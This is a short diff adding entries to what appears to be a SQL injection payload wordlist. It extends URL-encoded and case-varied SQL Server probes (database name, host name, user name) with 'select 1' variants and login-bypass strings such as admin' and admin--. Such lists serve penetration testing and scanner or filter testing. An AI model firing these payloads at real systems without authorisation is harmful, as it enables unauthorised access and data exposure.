@@ -97,3 +97,10 @@ SelEcT Db_NaMe()
 SELECT HOST_NAME()
 %53%45%4c%45%43%54%20%48%4f%53%54%5f%4e%41%4d%45%28%29
 %53%45%4c%45%43%54%20%75%73%65%72%5f%6e%61%6d%65%28%29%3b
+(select%201)
+select%201
+(select%201%2c2)
+select%201%2c2
+admin'
+admin#
+admin--
